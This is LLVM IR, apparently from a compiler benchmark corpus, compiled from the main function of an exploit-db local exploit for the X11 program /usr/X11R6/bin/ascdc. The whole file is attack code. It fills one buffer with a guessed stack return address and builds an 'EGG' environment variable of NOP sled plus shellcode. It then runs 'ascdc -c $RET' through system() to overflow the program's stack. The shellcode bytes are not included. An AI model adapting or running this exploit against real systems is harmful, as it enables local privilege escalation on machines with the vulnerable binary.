; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20679.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20679.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [40 x i8] c"unable to allocate memory for %d bytes\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"/usr/X11R6/bin/ascdc local exploit.\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Coded by The Itch / BsE\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"Using return address: 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"Using buffersize    : %d\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"RET=\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"/usr/X11R6/bin/ascdc -c $RET\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %14, i32* %11, align 4
  %15 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp sgt i32 %16, 1
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @atoi(i8* %21)
  store i32 %22, i32* %11, align 4
  br label %23

23:                                               ; preds = %18, %2
  %24 = load i32, i32* %11, align 4
  %25 = call i8* @malloc(i32 %24)
  store i8* %25, i8** %6, align 8
  %26 = icmp ne i8* %25, null
  br i1 %26, label %31, label %27

27:                                               ; preds = %23
  %28 = load i32, i32* %11, align 4
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i32 %28)
  %30 = call i32 @exit(i32 1) #3
  unreachable

31:                                               ; preds = %23
  %32 = load i32, i32* %12, align 4
  %33 = call i8* @malloc(i32 %32)
  store i8* %33, i8** %7, align 8
  %34 = icmp ne i8* %33, null
  br i1 %34, label %39, label %35

35:                                               ; preds = %31
  %36 = load i32, i32* %12, align 4
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i32 %36)
  %38 = call i32 @exit(i32 1) #3
  unreachable

39:                                               ; preds = %31
  %40 = call i64 (...) @get_sp()
  store i64 %40, i64* %10, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %43 = load i64, i64* %10, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i64 %43)
  %45 = load i32, i32* %11, align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i32 %45)
  %47 = load i8*, i8** %6, align 8
  store i8* %47, i8** %8, align 8
  %48 = load i8*, i8** %8, align 8
  %49 = bitcast i8* %48 to i64*
  store i64* %49, i64** %9, align 8
  store i32 0, i32* %13, align 4
  br label %50

50:                                               ; preds = %58, %39
  %51 = load i32, i32* %13, align 4
  %52 = load i32, i32* %11, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %61

54:                                               ; preds = %50
  %55 = load i64, i64* %10, align 8
  %56 = load i64*, i64** %9, align 8
  %57 = getelementptr inbounds i64, i64* %56, i32 1
  store i64* %57, i64** %9, align 8
  store i64 %55, i64* %56, align 8
  br label %58

58:                                               ; preds = %54
  %59 = load i32, i32* %13, align 4
  %60 = add nsw i32 %59, 4
  store i32 %60, i32* %13, align 4
  br label %50

61:                                               ; preds = %50
  %62 = load i8*, i8** %7, align 8
  store i8* %62, i8** %8, align 8
  store i32 0, i32* %13, align 4
  br label %63

63:                                               ; preds = %76, %61
  %64 = load i32, i32* %13, align 4
  %65 = load i32, i32* %12, align 4
  %66 = load i32*, i32** @shellcode, align 8
  %67 = call i32 @strlen(i32* %66)
  %68 = sub nsw i32 %65, %67
  %69 = sub nsw i32 %68, 1
  %70 = icmp slt i32 %64, %69
  br i1 %70, label %71, label %79

71:                                               ; preds = %63
  %72 = load i32, i32* @NOP, align 4
  %73 = trunc i32 %72 to i8
  %74 = load i8*, i8** %8, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %8, align 8
  store i8 %73, i8* %74, align 1
  br label %76

76:                                               ; preds = %71
  %77 = load i32, i32* %13, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %13, align 4
  br label %63

79:                                               ; preds = %63
  store i32 0, i32* %13, align 4
  br label %80

80:                                               ; preds = %94, %79
  %81 = load i32, i32* %13, align 4
  %82 = load i32*, i32** @shellcode, align 8
  %83 = call i32 @strlen(i32* %82)
  %84 = icmp slt i32 %81, %83
  br i1 %84, label %85, label %97

85:                                               ; preds = %80
  %86 = load i32*, i32** @shellcode, align 8
  %87 = load i32, i32* %13, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  %90 = load i32, i32* %89, align 4
  %91 = trunc i32 %90 to i8
  %92 = load i8*, i8** %8, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %8, align 8
  store i8 %91, i8* %92, align 1
  br label %94

94:                                               ; preds = %85
  %95 = load i32, i32* %13, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %13, align 4
  br label %80

97:                                               ; preds = %80
  %98 = load i8*, i8** %6, align 8
  %99 = load i32, i32* %11, align 4
  %100 = sub nsw i32 %99, 1
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %98, i64 %101
  store i8 0, i8* %102, align 1
  %103 = load i8*, i8** %7, align 8
  %104 = load i32, i32* %12, align 4
  %105 = sub nsw i32 %104, 1
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %103, i64 %106
  store i8 0, i8* %107, align 1
  %108 = load i8*, i8** %7, align 8
  %109 = call i32 @memcpy(i8* %108, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %110 = load i8*, i8** %7, align 8
  %111 = call i32 @putenv(i8* %110)
  %112 = load i8*, i8** %6, align 8
  %113 = call i32 @memcpy(i8* %112, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 4)
  %114 = load i8*, i8** %6, align 8
  %115 = call i32 @putenv(i8* %114)
  %116 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @get_sp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
